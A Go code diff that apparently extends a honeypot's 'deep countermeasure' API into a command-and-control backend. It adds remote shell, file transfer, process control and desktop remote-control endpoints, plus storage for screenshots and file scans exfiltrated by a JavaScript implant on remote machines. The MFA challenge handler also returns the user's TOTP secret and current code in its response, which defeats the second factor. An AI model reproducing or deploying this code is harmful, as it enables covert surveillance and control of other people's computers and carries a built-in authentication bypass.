@@ -2,6 +2,8 @@ package api
 
 import (
 	"crypto/rand"
+	"crypto/sha256"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -29,6 +31,12 @@ type Server struct {
 	store           *store.Store
 	vulnDB          *vulndb.DB
 	wsHub           *WSHub
+	shellHub        *ShellHub    // 远程 Shell WebSocket 会话管理
+	transferHub     *TransferHub // 文件传输管理
+	processHub      *ProcessHub  // 进程管理
+	desktopHub      *DesktopHub  // 桌面远控会话管理
+	mfaProvider     *MFAProvider // MFA 多因子认证
+	auditChain      *AuditChain  // 不可篡改审计链
 	profileEngine   *profile.Engine
 	clusterMgr      *cluster.Manager     // 集群管理端 (可选)
 	clusterGen      *cluster.Generator   // Agent 生成引擎 (可选)
@@ -47,6 +55,12 @@ func NewServer(logger *log.Logger, st *store.Store, vdb *vulndb.DB, hub *WSHub, 
 		store:         st,
 		vulnDB:        vdb,
 		wsHub:         hub,
+		shellHub:      NewShellHub(logger),
+		transferHub:   NewTransferHub(""),
+		processHub:    NewProcessHub(),
+		desktopHub:    NewDesktopHub(logger),
+		mfaProvider:   NewMFAProvider(),
+		auditChain:    NewAuditChain(),
 		profileEngine: profile.NewEngine(),
 		mux:           http.NewServeMux(),
 		apiKey:        apiKey,
@@ -79,6 +93,17 @@ func (s *Server) SetTrapConfig(data []byte) {
 // SetTraceEngine 设置溯源反制引擎（由 main 注入，用于深度反制 API）
 func (s *Server) SetTraceEngine(engine *traceability.Engine) {
 	s.traceEngine = engine
+	if engine != nil {
+		auditFn := func(opType countermeasure.OpType, targetIP, actor, action, result string) {
+			engine.GetAuditTrail().RecordComplete(opType, targetIP, actor, action, result)
+			// 同步追加到不可篡改审计链
+			s.auditChain.Append(string(opType), targetIP, actor, action, result)
+		}
+		s.shellHub.SetAuditRecorder(auditFn)
+		s.transferHub.SetAuditRecorder(auditFn)
+		s.processHub.SetAuditRecorder(auditFn)
+		s.desktopHub.SetAuditRecorder(auditFn)
+	}
 }
 
 func (s *Server) registerRoutes() {
@@ -134,6 +159,33 @@ func (s *Server) registerRoutes() {
 	s.mux.HandleFunc("/api/countermeasure/audit", s.handleCountermeasureAudit)
 	// 深度反制 — 攻击者团队拓扑
 	s.mux.HandleFunc("/api/countermeasure/topology", s.handleCountermeasureTopology)
+	// 深度反制 — 截屏记录列表/查询/下载
+	s.mux.HandleFunc("/api/countermeasure/screencaps", s.handleScreenCapsList)
+	s.mux.HandleFunc("/api/countermeasure/screencaps/", s.handleScreenCapDetail)
+	// 深度反制 — 文件扫描记录
+	s.mux.HandleFunc("/api/countermeasure/filescans", s.handleFileScansList)
+	// 深度反制 — 远程 Shell WebSocket
+	s.mux.HandleFunc("/api/countermeasure/shell", s.shellHub.HandleShell)
+	// 深度反制 — 文件传输
+	s.mux.HandleFunc("/api/countermeasure/transfer/upload", s.transferHub.HandleTransferUpload)
+	s.mux.HandleFunc("/api/countermeasure/transfer/download", s.transferHub.HandleTransferDownload)
+	s.mux.HandleFunc("/api/countermeasure/transfer/status", s.transferHub.HandleTransferStatus)
+	s.mux.HandleFunc("/api/countermeasure/transfer/pause", s.transferHub.HandleTransferPause)
+	s.mux.HandleFunc("/api/countermeasure/transfer/list", s.transferHub.HandleTransferList)
+	// 深度反制 — 进程管理
+	s.mux.HandleFunc("/api/countermeasure/processes", s.processHub.HandleProcessList)
+	s.mux.HandleFunc("/api/countermeasure/processes/start", s.processHub.HandleProcessStart)
+	s.mux.HandleFunc("/api/countermeasure/processes/stop", s.processHub.HandleProcessStop)
+	s.mux.HandleFunc("/api/countermeasure/processes/delete", s.processHub.HandleProcessDelete)
+	// 深度反制 — 桌面远控（WebSocket 帧流）
+	s.mux.HandleFunc("/api/countermeasure/desktop", s.desktopHub.HandleDesktopViewer)
+	s.mux.HandleFunc("/api/countermeasure/desktop/agent", s.desktopHub.HandleDesktopAgent)
+	// 安全合规 — MFA 二次认证
+	s.mux.HandleFunc("/api/mfa/challenge", s.handleMFAChallenge)
+	s.mux.HandleFunc("/api/mfa/verify", s.handleMFAVerify)
+	// 安全合规 — 不可篡改审计链
+	s.mux.HandleFunc("/api/audit/chain", s.handleAuditChain)
+	s.mux.HandleFunc("/api/audit/chain/verify", s.handleAuditChainVerify)
 
 	// 前端 SPA 静态文件服务（由 go:embed 嵌入 web/dist/）
 	s.mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
@@ -778,6 +830,135 @@ func (s *Server) handleAgentGenerate(w http.ResponseWriter, r *http.Request) {
 }
 
 // ============================================================
+// 安全合规 — MFA 二次认证 & 不可篡改审计链
+// ============================================================
+
+// handleMFAChallenge 请求 MFA 二次验证码
+// POST /api/mfa/challenge
+func (s *Server) handleMFAChallenge(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "POST required"})
+		return
+	}
+
+	var req struct {
+		User string `json:"user"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.User == "" {
+		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "user required"})
+		return
+	}
+
+	// 如果用户还没有 TOTP secret，先生成一个
+	secret := s.mfaProvider.GetSecret(req.User)
+	if secret == "" {
+		secret = s.mfaProvider.GenerateSecret(req.User)
+		s.logger.Infow("mfa secret generated", "user", req.User)
+	}
+
+	// 生成一次性挑战码
+	challenge := s.mfaProvider.GenerateChallenge(req.User)
+	// 同时计算当前 TOTP
+	totp := generateTOTP(secret, time.Now().Unix())
+
+	s.logger.Infow("mfa challenge issued", "user", req.User)
+
+	writeJSON(w, http.StatusOK, map[string]interface{}{
+		"challenge":  challenge,
+		"totp":       totp,   // 仅在开发/测试环境返回
+		"secret":     secret, // 仅在开发/测试环境返回
+		"expires_in": 120,
+	})
+}
+
+// handleMFAVerify 验证 MFA 码并签发操作令牌
+// POST /api/mfa/verify
+func (s *Server) handleMFAVerify(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "POST required"})
+		return
+	}
+
+	var req struct {
+		User string   `json:"user"`
+		Code string   `json:"code"`
+		Ops  []string `json:"ops"` // 请求的操作列表
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.User == "" || req.Code == "" {
+		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "user and code required"})
+		return
+	}
+
+	// 验证挑战码或 TOTP
+	valid := s.mfaProvider.VerifyChallenge(req.User, req.Code) ||
+		s.mfaProvider.ValidateCode(req.User, req.Code)
+
+	if !valid {
+		s.logger.Warnw("mfa verify failed", "user", req.User)
+		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "invalid MFA code"})
+		return
+	}
+
+	// 签发临时操作令牌
+	if len(req.Ops) == 0 {
+		req.Ops = []string{"shell", "transfer", "process", "desktop"}
+	}
+	token := s.mfaProvider.IssueToken(req.User, req.Ops)
+
+	s.logger.Infow("mfa token issued", "user", req.User, "ops", req.Ops)
+
+	// 记录到审计链
+	s.auditChain.Append("mfa", req.User, "mfa", "token_issued", fmt.Sprintf("ops=%v", req.Ops))
+
+	writeJSON(w, http.StatusOK, map[string]interface{}{
+		"token":      token,
+		"expires_in": 300,
+		"ops":        req.Ops,
+	})
+}
+
+// handleAuditChain 获取不可篡改审计链
+// GET /api/audit/chain?limit={n}
+func (s *Server) handleAuditChain(w http.ResponseWriter, r *http.Request) {
+	entries := s.auditChain.Entries()
+	limit := queryInt(r, "limit", 100)
+
+	if limit > 0 && limit < len(entries) {
+		entries = entries[len(entries)-limit:]
+	}
+
+	// 验证链完整性
+	valid, tamperedIdx := s.auditChain.Verify()
+
+	writeJSON(w, http.StatusOK, map[string]interface{}{
+		"total":          len(entries),
+		"head":           s.auditChain.Head(),
+		"chain_valid":    valid,
+		"tampered_index": tamperedIdx,
+		"entries":        entries,
+	})
+}
+
+// handleAuditChainVerify 验证审计链完整性
+// GET /api/audit/chain/verify
+func (s *Server) handleAuditChainVerify(w http.ResponseWriter, r *http.Request) {
+	valid, tamperedIdx := s.auditChain.Verify()
+
+	status := "intact"
+	if !valid {
+		status = fmt.Sprintf("tampered at index %d", tamperedIdx)
+	}
+
+	writeJSON(w, http.StatusOK, map[string]interface{}{
+		"valid":          valid,
+		"tampered_index": tamperedIdx,
+		"status":         status,
+		"head":           s.auditChain.Head(),
+		"total_entries":  len(s.auditChain.Entries()),
+	})
+}
+
+// ============================================================
 // 深度反制 C2 API — 植入体数据回传、得分、审计、拓扑
 // ============================================================
 
@@ -804,10 +985,10 @@ func (s *Server) handleCountermeasureExfil(w http.ResponseWriter, r *http.Reques
 	// POST JSON 模式：从请求体解析结构化数据
 	if r.Method == http.MethodPost {
 		var body struct {
-			Type     string                 `json:"type"`
-			TargetIP string                 `json:"target_ip"`
-			Data     map[string]interface{} `json:"data"`
-			DataType string                 `json:"data_type"`
+			Type     string      `json:"type"`
+			TargetIP string      `json:"target_ip"`
+			Data     interface{} `json:"data"`
+			DataType string      `json:"data_type"`
 		}
 		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
 			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid JSON body"})
@@ -867,10 +1048,139 @@ func (s *Server) handleCountermeasureExfil(w http.ResponseWriter, r *http.Reques
 	audit.RecordComplete(opType, remoteIP, "implant", "exfil_endpoint",
 		fmt.Sprintf("data_received: %d bytes, score: %d", len(data), score))
 
+	// 持久化存储截屏和文件扫描数据
+	s.persistExfilData(remoteIP, dataType, data, len(data))
+
 	writeJSON(w, http.StatusOK, map[string]interface{}{
 		"status": "received",
 		"score":  score,
 	})
+}
+
+// persistExfilData 根据数据类型将回传数据持久化到 DB
+func (s *Server) persistExfilData(remoteIP, dataType, data string, dataLen int) {
+	switch dataType {
+	case "screen_capture", "screen_cap":
+		s.persistScreenCapture(remoteIP, data)
+	case "file_scan":
+		s.persistFileScan(remoteIP, data)
+	default:
+		s.logger.Debugw("exfil persist skipped (unsupported type)", "type", dataType)
+	}
+}
+
+// persistScreenCapture 解析并存储截屏数据
+func (s *Server) persistScreenCapture(remoteIP, data string) {
+	// 截屏数据格式: base64 JPEG (data:image/jpeg;base64,xxx 或纯 base64)
+	var (
+		resolution = "unknown"
+		imageData  string
+		thumbnail  string
+		format     = "jpeg"
+	)
+
+	// 解析 JSON 格式的截屏元数据 (来自 JS 植入体)
+	type screencapMeta struct {
+		Width  int    `json:"width"`
+		Height int    `json:"height"`
+		Image  string `json:"image"`
+		Format string `json:"format"`
+	}
+	var meta screencapMeta
+	if err := json.Unmarshal([]byte(data), &meta); err == nil && meta.Image != "" {
+		if meta.Width > 0 && meta.Height > 0 {
+			resolution = fmt.Sprintf("%dx%d", meta.Width, meta.Height)
+		}
+		imageData = meta.Image
+		if meta.Format != "" {
+			format = meta.Format
+		}
+	} else {
+		// 纯 base64 字符串或 data: URI
+		imageData = data
+	}
+
+	// 去掉 data: URI 前缀
+	if idx := strings.Index(imageData, "base64,"); idx != -1 {
+		imageData = imageData[idx+7:]
+	}
+
+	// 计算数据哈希
+	dataHash := fmt.Sprintf("%x", sha256.Sum256([]byte(imageData)))
+	sizeBytes := int64(len(imageData))
+
+	// 生成缩略图 (取前 256 字符作为预览标识，实际缩略图由前端渲染)
+	thumbLen := 256
+	if len(imageData) < thumbLen {
+		thumbLen = len(imageData)
+	}
+	thumbnail = imageData[:thumbLen]
+
+	// 验证 base64 有效性
+	if _, err := base64.StdEncoding.DecodeString(imageData); err != nil {
+		s.logger.Warnw("invalid screencap base64", "ip", remoteIP, "error", err)
+		return
+	}
+
+	// 生成会话 ID
+	sessionID := fmt.Sprintf("sc_%s_%d", strings.ReplaceAll(remoteIP, ".", "_"), time.Now().Unix())
+
+	id, err := s.store.SaveScreenCapture(remoteIP, resolution, format, dataHash, sessionID, thumbnail, sizeBytes, true)
+	if err != nil {
+		s.logger.Errorw("persist screencap failed", "ip", remoteIP, "error", err)
+		return
+	}
+	s.logger.Infow("screencap persisted", "id", id, "ip", remoteIP, "resolution", resolution, "size", sizeBytes)
+
+	// 记录审计
+	if s.traceEngine != nil {
+		s.traceEngine.GetAuditTrail().RecordComplete(
+			countermeasure.OpScreenCapture, remoteIP, "persist", "db_store",
+			fmt.Sprintf("screencap_id=%d resolution=%s size=%d", id, resolution, sizeBytes),
+		)
+	}
+}
+
+// persistFileScan 解析并存储文件扫描数据
+func (s *Server) persistFileScan(remoteIP, data string) {
+	var files []map[string]interface{}
+	if err := json.Unmarshal([]byte(data), &files); err != nil {
+		// 可能不是数组，尝试单个文件
+		var single map[string]interface{}
+		if err2 := json.Unmarshal([]byte(data), &single); err2 != nil {
+			s.logger.Warnw("invalid filescan data", "ip", remoteIP, "error", err)
+			return
+		}
+		files = []map[string]interface{}{single}
+	}
+
+	for _, f := range files {
+		filePath, _ := f["path"].(string)
+		fileName, _ := f["name"].(string)
+		if fileName == "" {
+			fileName = filePath
+		}
+		fileSize := int64(0)
+		if sz, ok := f["size"].(float64); ok {
+			fileSize = int64(sz)
+		}
+		category, _ := f["category"].(string)
+		sensitive := false
+		if sens, ok := f["sensitive"].(bool); ok {
+			sensitive = sens
+		}
+		contentPreview, _ := f["preview"].(string)
+		if len(contentPreview) > 1024 {
+			contentPreview = contentPreview[:1024]
+		}
+
+		id, err := s.store.SaveFileScan(remoteIP, filePath, fileName, category, contentPreview, fileSize, sensitive)
+		if err != nil {
+			s.logger.Errorw("persist filescan failed", "ip", remoteIP, "file", filePath, "error", err)
+			continue
+		}
+		s.logger.Infow("filescan persisted", "id", id, "ip", remoteIP, "file", filePath, "sensitive", sensitive)
+	}
 }
 
 // handleCountermeasureScoreboard 获取防守方得分总表
@@ -957,6 +1267,90 @@ func (s *Server) handleCountermeasureTopology(w http.ResponseWriter, r *http.Req
 
 	topo := countermeasure.GenerateNetProbeReport("honeypot", nodes)
 	writeJSON(w, http.StatusOK, topo)
+}
+
+// handleScreenCapsList 截屏记录分页列表
+// GET /api/countermeasure/screencaps?ip=&limit=&offset=
+func (s *Server) handleScreenCapsList(w http.ResponseWriter, r *http.Request) {
+	remoteIP := r.URL.Query().Get("ip")
+	limit := queryInt(r, "limit", 20)
+	offset := queryInt(r, "offset", 0)
+
+	records, total, err := s.store.ListScreenCaptures(remoteIP, limit, offset)
+	if err != nil {
+		s.logger.Errorw("screencaps list failed", "error", err)
+		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "query failed"})
+		return
+	}
+	if records == nil {
+		records = []store.ScreenCaptureRecord{}
+	}
+
+	writeJSON(w, http.StatusOK, map[string]interface{}{
+		"total":   total,
+		"limit":   limit,
+		"offset":  offset,
+		"records": records,
+	})
+}
+
+// handleScreenCapDetail 截屏详情/下载
+// GET /api/countermeasure/screencaps/{id}  - 获取单条记录完整数据(含缩略图)
+// GET /api/countermeasure/screencaps/{id}/download - 下载完整截屏 thumbnail
+func (s *Server) handleScreenCapDetail(w http.ResponseWriter, r *http.Request) {
+	// 解析路径: /api/countermeasure/screencaps/{id}[/download]
+	path := strings.TrimPrefix(r.URL.Path, "/api/countermeasure/screencaps/")
+	parts := strings.SplitN(path, "/", 2)
+
+	idStr := parts[0]
+	id, err := strconv.ParseInt(idStr, 10, 64)
+	if err != nil {
+		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid id"})
+		return
+	}
+
+	record, err := s.store.GetScreenCapture(id)
+	if err != nil {
+		writeJSON(w, http.StatusNotFound, map[string]string{"error": "screencap not found"})
+		return
+	}
+
+	// 如果路径包含 /download，返回 base64 图片数据
+	if len(parts) > 1 && parts[1] == "download" {
+		w.Header().Set("Content-Type", "text/plain")
+		w.Header().Set("Cache-Control", "public, max-age=3600")
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte(record.Thumbnail))
+		return
+	}
+
+	writeJSON(w, http.StatusOK, record)
+}
+
+// handleFileScansList 文件扫描分页列表
+// GET /api/countermeasure/filescans?ip=&category=&limit=&offset=
+func (s *Server) handleFileScansList(w http.ResponseWriter, r *http.Request) {
+	remoteIP := r.URL.Query().Get("ip")
+	category := r.URL.Query().Get("category")
+	limit := queryInt(r, "limit", 20)
+	offset := queryInt(r, "offset", 0)
+
+	records, total, err := s.store.ListFileScans(remoteIP, category, limit, offset)
+	if err != nil {
+		s.logger.Errorw("filescans list failed", "error", err)
+		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "query failed"})
+		return
+	}
+	if records == nil {
+		records = []store.FileScanRecord{}
+	}
+
+	writeJSON(w, http.StatusOK, map[string]interface{}{
+		"total":   total,
+		"limit":   limit,
+		"offset":  offset,
+		"records": records,
+	})
 }
 
 // requestLogMiddleware 记录每个 HTTP 请求的方法、路径、状态码和耗时
